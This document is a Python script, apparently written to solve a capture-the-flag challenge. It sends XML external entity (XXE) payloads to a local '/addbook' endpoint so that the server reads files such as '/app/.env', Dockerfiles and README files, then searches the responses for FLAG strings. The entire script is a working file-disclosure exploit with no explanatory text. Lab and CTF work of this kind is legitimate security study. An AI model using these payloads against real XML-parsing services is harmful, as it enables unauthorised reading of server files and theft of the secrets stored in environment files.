import requests
import re

files_to_test = [
    '/app/requirements.txt',
    '/app/README.md', 
    '/app/README.txt',
    '/app/config.txt',
    '/app/.env',
    '/app/Dockerfile',
    '/Dockerfile',
    '/README.md',
    '/requirements.txt'
]

base_url = 'http://127.0.0.1:5000/addbook'
results = {}
flag_found = False

print("[*] Testing XXE payloads against common application files...")
print(f"[*] Target: {base_url}\n")

for filepath in files_to_test:
    xml_payload = f'''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file://{filepath}">]>
<Book>
    <Title>Read {filepath}</Title>
    <ISBN>&file;</ISBN>
    <Editor>Test</Editor>
    <Publisher>Test</Publisher>
    <Chapters></Chapters>
</Book>'''
    
    try:
        print(f"[*] Testing: {filepath}")
        response = requests.post(
            base_url,
            data={'xml': xml_payload},
            timeout=5
        )
        
        print(f"    Status: {response.status_code} | Length: {len(response.content)}B")
        
        # Check for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text, re.IGNORECASE)
        
        if flag_matches:
            flag_found = True
            results[filepath] = response.text
            print(f"[!] FLAG FOUND in {filepath}")
            print(f"[!] Flags: {flag_matches}")
            print(f"[+] Full Response:\n{response.text}\n")
        elif response.status_code == 200:
            # Check if file was successfully read
            if 'You have append this book successfully' in response.text or 'successfully' in response.text.lower():
                results[filepath] = response.text
                print(f"[+] File successfully read (no FLAG pattern)")
                # Print full response to check content
                print(f"[+] Response content:\n{response.text}\n")
            else:
                print(f"[+] Response:\n{response.text}\n")
        else:
            print(f"[-] Unexpected status code\n")
            
    except requests.exceptions.Timeout:
        print(f"[-] Timeout reading {filepath}\n")
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error reading {filepath}: {e}\n")
    except Exception as e:
        print(f"[-] Error reading {filepath}: {e}\n")

print("\n" + "="*60)
print("SUMMARY OF RESULTS")
print("="*60)

if flag_found:
    print("\n[!] FLAG(S) FOUND:")
    for path, content in results.items():
        flag_matches = re.findall(r'FLAG\{[^}]+\}', content, re.IGNORECASE)
        if flag_matches:
            print(f"\n  File: {path}")
            print(f"  Flags: {flag_matches}")
            print(f"\n  Full content:\n{content}")
else:
    print("\n[*] No FLAG pattern found in any file")
    
if results:
    print(f"\n[*] Successfully read {len(results)} file(s)")
    for path in results.keys():
        print(f"  - {path}")
else:
    print("\n[-] No files were successfully read")

